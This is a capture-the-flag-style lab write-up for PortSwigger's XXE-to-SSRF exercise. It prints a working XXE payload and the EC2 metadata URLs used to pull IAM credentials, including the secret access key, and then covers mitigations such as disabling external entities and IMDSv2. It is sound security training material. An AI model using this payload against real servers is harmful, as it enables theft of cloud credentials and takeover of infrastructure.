# PortSwigger Lab Writeup

## Lab: Exploiting XXE to Perform SSRF Attacks – Apprentice

---

## Lab Overview

This lab demonstrates how an **XML External Entity (XXE)** vulnerability can be leveraged to perform **Server-Side Request Forgery (SSRF)**.

The application processes XML input in the **Check Stock** functionality and allows external entities. Instead of reading local files, the external entity is used to make HTTP requests from the vulnerable server to internal resources.

The objective is to exploit the XXE vulnerability to access the EC2 metadata service and retrieve the server's IAM Secret Access Key.

---

## Objective

- Identify an XXE vulnerability
- Exploit XXE to perform SSRF
- Access the EC2 metadata endpoint
- Retrieve the IAM Secret Access Key

---

## Tools Used

- Burp Suite
- Web Browser

---

## Exploitation Steps

1. Navigate to any product page.

2. Click **Check Stock**.

3. Intercept the POST request using Burp Suite.

4. Insert the following DOCTYPE declaration between the XML declaration and the `stockCheck` element:

```xml
<!DOCTYPE test [
    <!ENTITY xxe SYSTEM "http://169.254.169.254/">
]>
```

5. Replace the `productId` value with the entity reference:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
    <!ENTITY xxe SYSTEM "http://169.254.169.254/">
]>
<stockCheck>
    <productId>&xxe;</productId>
    <storeId>1</storeId>
</stockCheck>
```

6. Forward the request.

7. The response displays the available metadata directories.

8. Continue updating the external entity URL to enumerate the metadata service:

```
http://169.254.169.254/latest/
```

```
http://169.254.169.254/latest/meta-data/
```

```
http://169.254.169.254/latest/meta-data/iam/
```

```
http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

9. Access the administrator role:

```
http://169.254.169.254/latest/meta-data/iam/security-credentials/admin
```

10. Forward the request.

11. The response contains JSON with the IAM credentials, including the **SecretAccessKey**.

---

## Screenshots

### 1. Original XML Request
![Original Request](https://github.com/bunny4757/Cybersecurity/blob/main/Web-Security-Academy/Images/xxe_ssrf_lab_2-2.png)

### 2. XXE Payload and IAM Credentials Retrieved
![Payload](https://github.com/bunny4757/Cybersecurity/blob/main/Web-Security-Academy/Images/xxe_ssrf_lab_2-3.png)
![](https://github.com/bunny4757/Cybersecurity/blob/main/Web-Security-Academy/Images/xxe_ssrf_lab_2-4.png)

---

## Result

The vulnerable XML parser made HTTP requests to the EC2 metadata service on behalf of the application.

By enumerating the metadata endpoint, the IAM credentials were disclosed, including the Secret Access Key.

---

## Vulnerability Explanation

This vulnerability combines **XML External Entity (XXE)** injection with **Server-Side Request Forgery (SSRF)**.

### 1. XML External Entity Processing

The XML parser processes external entities defined by the attacker.

```xml
<!ENTITY xxe SYSTEM "http://169.254.169.254/">
```

Instead of loading a local file, the parser sends an HTTP request.

### 2. Server-Side Request Forgery (SSRF)

Because the request originates from the application server, it can access internal resources that are inaccessible to external users.

### 3. EC2 Metadata Service Exposure

Cloud platforms expose instance metadata at:

```
http://169.254.169.254/
```

This endpoint may contain sensitive information such as:

- IAM Roles
- Temporary Access Keys
- Secret Access Keys
- Session Tokens

---

## Why the Attack Works

| Component | Effect |
|----------|--------|
| `<!ENTITY>` | Defines an external entity |
| `SYSTEM` | References an external URL |
| `http://169.254.169.254` | Internal EC2 metadata service |
| XML Parser | Makes server-side HTTP requests |
| `&xxe;` | Inserts the server response into the XML document |

---

## Mitigation Techniques

### 1. Disable External Entity Processing

Configure the XML parser to disable DTDs and external entities.

---

### 2. Disable DOCTYPE Declarations

Reject XML documents containing:

```xml
<!DOCTYPE ...>
```

unless absolutely required.

---

### 3. Restrict Outbound Network Access

Prevent application servers from accessing internal services unless necessary.

Use firewall rules or network segmentation to block access to:

```
169.254.169.254
```

---

### 4. Protect Cloud Metadata Services

Use cloud provider security features such as:

- AWS IMDSv2
- Metadata authentication
- Network restrictions

---

### 5. Use Secure XML Parsers

Use XML libraries configured with secure defaults that disable external entity resolution.

---

## Key Takeaways

- XXE vulnerabilities can be used to perform SSRF attacks.
- Internal services such as cloud metadata endpoints are common SSRF targets.
- Sensitive credentials can be exposed if external entities are enabled.
- Disabling external entity processing and restricting server-side network access are essential defenses.

---

## Lab Status

Solved Successfully
